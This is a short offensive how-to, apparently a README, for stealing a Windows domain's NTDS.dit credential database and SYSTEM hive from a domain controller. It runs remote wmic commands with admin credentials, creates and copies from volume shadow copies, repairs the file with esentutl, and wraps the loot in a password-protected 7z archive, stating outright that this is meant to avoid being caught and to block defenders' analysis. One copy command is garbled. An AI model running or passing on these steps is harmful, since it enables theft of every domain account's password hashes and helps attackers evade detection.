# DUMP-NTDS-WITHOUT-PASS

A way to Dump NTDS without password
shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


query the shadows list, there is a date on it, check if it is recent
they are almost certainly already there. if not, you will have to do it yourself

net start Volume Shadow Copy
shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


then in the shadow copy listing find the newest one
Shadow Copy Volume: \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
respectively we need the copy number for the following command


shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\? \"\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\\?


ntds.dit / security / system files should be placed in c:\temp\log\
Take the portable console 7z and pack it in the archive with password
Code: [Highlight]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


unzip the password protected archive, if you get an error when trying to decrypt the ntds file (the file is corrupted), do the following


Esentutl /p C:\log\ntds.dit


the trick with this method is that we don't actually dump anything, we just download the ntds
so we won't get caught pulling the ntds we pack it in a password protected archive

if you have problems with being caught and kicked off the net after dumping ntds, try this method
you can burn it only if you know the password from the archive, and it is impossible to analyze what exactly you take without knowing the password from the archive

CREDITS: Learners Room @dtob1804
